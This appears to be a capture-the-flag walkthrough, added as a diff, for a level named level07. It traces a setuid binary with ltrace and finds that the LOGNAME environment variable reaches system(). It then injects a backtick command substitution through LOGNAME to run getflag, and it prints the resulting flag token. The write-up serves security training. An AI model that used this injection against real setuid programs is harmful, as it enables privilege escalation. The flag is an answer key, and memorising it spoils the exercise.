@@ -1,0 +1,27 @@
+- List the files in level07 user home directory to find 'level07' executable which belong to flag07 user (setuid control bit active).
+
+- Use ltrace to take a look at the functions called inside the executable.
+
+`ltrace ./level07`
+__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                       = 2007
+geteuid()                                                       = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
+getenv("LOGNAME")                                               = "level07"
+asprintf(0xbffff734, 0x8048688, 0xbfffff42, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                          = 0
++++ exited (status 0) +++
+
+- Note the call of 'getenv("LOGNAME")' which get the value of the environment variable LOGNAME as a character's string.
+
+- This string seems to be used later as the parameter of the shell command echo executed via the 'system()' function.
+
+- Change the value of 'LOGNAME' to make echo print the result of getflag, then run the executable.
+
+`export LOGNAME='`getflag`'`
+`./level07`
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
